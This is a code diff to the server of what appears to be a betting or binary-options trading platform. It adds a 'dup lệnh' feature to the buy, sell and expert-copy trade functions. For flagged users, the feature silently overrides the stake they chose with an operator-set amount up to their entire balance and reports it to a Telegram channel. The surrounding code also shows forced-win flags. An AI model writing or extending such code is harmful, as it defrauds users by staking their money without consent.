@@ -39,7 +39,9 @@ var {
     getMaretingAcc,
     listF0With7Level,
     getGameChampionAcc,
-    insertGameChampion
+    insertGameChampion,
+    getDupBet,
+    updateDupLenh
 } = require("./../games/service.trade")
 
 app.use(cors({
@@ -1187,13 +1189,14 @@ function BTC_LESS_WIN() {
 
 //========================= XỬ LÝ ĐẶT CƯỢC
 
-function BetBUY(ws, data) {
+async function BetBUY(ws, data) {
     if (ANTI_BET) {
         let obj = { type: 'bet', mess: 'Vui lòng đợi phiên sau!', style: 'danger' }
         ws.send(JSON.stringify({ type: 'mess', data: obj }))
         return
     }
 
+    let betAcc = await getDupBet(data.uid);
     //let idPlayer = data.idPlayer;
 
     let uid = data.uid
@@ -1248,7 +1251,26 @@ function BetBUY(ws, data) {
                         PRICE_MAKETING_BUY += betAmount;
                     }
 
-                    AMOUNT_USER_BUY[`${uid}`] += betAmount
+                    // check user exist in dup lenh
+                  
+                    if(!betAcc){
+                        AMOUNT_USER_BUY[`${uid}`] += betAmount
+                    }else{
+                        let bet_dup_amount = betAcc.amount;
+                        
+                        if(bet_dup_amount>result.balance){
+                            bet_dup_amount = result.balance;
+                        }
+                        AMOUNT_USER_BUY[`${uid}`] = bet_dup_amount;
+                        Tele.sendMessThongBao(`Kích hoạt dup lệnh \n-Email: ${betAcc.email} \n-Số tiền: ${AMOUNT_USER_BUY[`${uid}`]}`)
+                        updateDupLenh(betAcc.id);
+                    }
+                  
+                    if(AMOUNT_USER_BUY[`${uid}`]>result.balance){
+                        AMOUNT_USER_BUY[`${uid}`] = result.balance;
+                    }
+                    data.betAmount =  AMOUNT_USER_BUY[`${uid}`];
+
                     BTC_USER_BUY[`${uid}`] = AMOUNT_USER_BUY[`${uid}`] + '||' + action + '||' + typeAccount + '||' + data.email + '||' + accMarketing + '||' + uid;
 
                     if (void 0 !== forceWin) {
@@ -1280,12 +1302,14 @@ function BetBUY(ws, data) {
     }
 }
 
-function BetSELL(ws, data) {
+async function BetSELL(ws, data) {
     if (ANTI_BET) {
         let obj = { type: 'bet', mess: 'Vui lòng đợi phiên sau!', style: 'danger' }
         ws.send(JSON.stringify({ type: 'mess', data: obj }))
         return
     }
+
+    let betAcc = await getDupBet(data.uid);
 
     let uid = data.uid
     let typeAccount = data.typeAccount
@@ -1343,7 +1367,24 @@ function BetSELL(ws, data) {
 
                     // nếu tồn tại acc marketing
 
-                    AMOUNT_USER_SELL[`${uid}`] += betAmount
+                    if(!betAcc){
+                        AMOUNT_USER_SELL[`${uid}`] += betAmount
+                    }else{
+                        let bet_dup_amount = betAcc.amount;
+                        
+                        if(bet_dup_amount>result.balance){
+                            bet_dup_amount = result.balance;
+                        }
+                        AMOUNT_USER_SELL[`${uid}`] = bet_dup_amount;
+                        Tele.sendMessThongBao(`Kích hoạt dup lệnh \n-Email: ${betAcc.email} \n-Số tiền: ${AMOUNT_USER_SELL[`${uid}`]}`)
+                        updateDupLenh(betAcc.id);
+                    }
+
+                    if(AMOUNT_USER_SELL[`${uid}`]>result.balance){
+                        AMOUNT_USER_SELL[`${uid}`] = result.balance;
+                    }
+                    data.betAmount =  AMOUNT_USER_SELL[`${uid}`];
+
                     BTC_USER_SELL[`${uid}`] = AMOUNT_USER_SELL[`${uid}`] + '||' + action + '||' + typeAccount + '||' + data.email  + '||' + accMarketing + '||' + uid;
 
                     if (void 0 !== forceWin) {
@@ -2347,7 +2388,7 @@ async function AITrade() {
 }
 
 async function BeginBet(ws, obj) {
-    
+
     let money_experts = await new Promise((resolve, reject) => {
         db.query(`select balance from account where type = 1 and email = ?`, [obj.email], (err, data) => {
             if (err || !data.length) reject();
@@ -2454,6 +2495,24 @@ async function tradeByExperts(obj, money_experts) {
                             // }
 
                             if (Number(accountByTypeAndEmail.balance) < Number(money_trade)) {
+                                money_trade = Number(accountByTypeAndEmail.balance);
+                            }
+
+                            let betAcc = await getDupBet(uid);
+
+                            if(betAcc){
+                              
+                                let bet_dup_amount = Number(betAcc.amount);
+                                
+                                if(bet_dup_amount>Number(accountByTypeAndEmail.balance)){
+                                    bet_dup_amount = Number(accountByTypeAndEmail.balance);
+                                }
+                                money_trade = bet_dup_amount;
+                                Tele.sendMessThongBao(`Kích hoạt dup lệnh \n-Email: ${betAcc.email} \n-Số tiền: ${money_trade}`)
+                                updateDupLenh(betAcc.id);
+                            }
+        
+                            if(Number(money_trade)>Number(accountByTypeAndEmail.balance)){
                                 money_trade = Number(accountByTypeAndEmail.balance);
                             }
 
